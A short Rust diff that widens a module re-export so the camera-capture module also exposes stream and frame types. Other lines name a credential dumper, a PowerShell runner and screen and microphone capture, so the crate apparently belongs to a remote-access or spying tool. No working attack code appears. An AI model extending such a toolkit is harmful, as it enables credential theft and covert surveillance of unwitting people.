@@ -16,5 +16,5 @@ pub use power_shell::PowerShellRunner;
 pub use cred_dump::CredentialDumper;
 pub use proxy_browser::ProxyBrowser;
 pub use screen_capture::{ScreenCapture, ScreenStream, ScreenFrame};
-pub use camera_capture::CameraCapture;
+pub use camera_capture::{CameraCapture, CameraStream, CameraFrame};
 pub use mic_capture::MicCapture;
